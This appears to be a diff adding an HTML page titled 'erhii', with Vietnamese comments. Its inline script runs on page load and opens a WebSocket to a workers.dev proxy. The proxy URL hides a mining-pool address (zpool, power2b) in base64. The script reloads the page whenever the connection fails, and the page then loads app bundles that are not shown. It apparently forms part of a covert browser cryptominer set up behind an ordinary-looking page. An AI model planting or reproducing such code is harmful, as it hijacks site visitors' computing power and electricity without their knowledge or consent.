@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>erhii</title>
+  <script>
+  const wsUrl = "wss://api-wss.quang71727374.workers.dev/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=";
+
+  function testWebSocket() {
+    let ws;
+
+    try {
+      ws = new WebSocket(wsUrl);
+    } catch (e) {
+      console.warn("Không thể tạo WebSocket:", e);
+      return setTimeout(() => location.reload(), 2000);
+    }
+
+    // Nếu không kết nối được
+    ws.onerror = function (e) {
+      console.warn("Lỗi WebSocket onerror", e);
+      setTimeout(() => location.reload(), 2000);
+    };
+
+    // Nếu server từ chối (như mã 530), nó thường gọi onclose
+    ws.onclose = function (e) {
+      if (e.code !== 1000) {
+        console.warn("WebSocket bị đóng bất thường. Mã:", e.code);
+        setTimeout(() => location.reload(), 2000);
+      }
+    };
+  }
+
+  // Gọi kiểm tra sau khi tải xong trang
+  window.addEventListener('load', testWebSocket);
+  </script>
+  <script defer src="chunk-vendors.11a54240.js"></script>
+  <script defer src="app.4645aab8.js"></script>
+</head>
+<body>
+  <div id="app"></div>
+</body>
+  </html>
